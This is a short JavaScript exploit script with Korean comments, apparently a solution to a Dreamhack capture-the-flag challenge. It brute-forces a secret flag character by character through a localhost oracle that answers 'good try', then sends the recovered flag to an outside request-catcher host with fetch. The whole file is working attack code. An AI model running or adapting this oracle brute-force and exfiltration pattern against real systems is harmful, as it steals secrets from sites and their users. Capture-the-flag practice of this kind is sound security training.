let server_flag = ''; // 전역 변수

const checkFlag = async () => {
    let found = true; // 초기 상태는 FLAG를 찾은 것으로 설정

    while (found) {
        found = false; // 다음 루프에서 FLAG를 찾지 못한 상태로 초기화

        for (let i = 32; i <= 127; i++) {
            const flag = String.fromCharCode(i);
            const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(server_flag + flag)}`;

            const response = await fetch(requestUrl);
            const text = await response.text();

            if (text === 'good try') {
                server_flag += flag; // 해당 문자를 추가
                console.log(`Current FLAG: ${server_flag}`);
                found = true; // FLAG를 찾았으므로 true로 설정
                break; // 다음 문자로 넘어가기 위해 루프 중단
            }
        }
    }

    console.log('Final FLAG:', server_flag);

    // 최종 FLAG로 요청 보내기 (응답 기다리지 않음)
    const finalRequestUrl = `https://nswmtml.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
    fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
};

checkFlag();
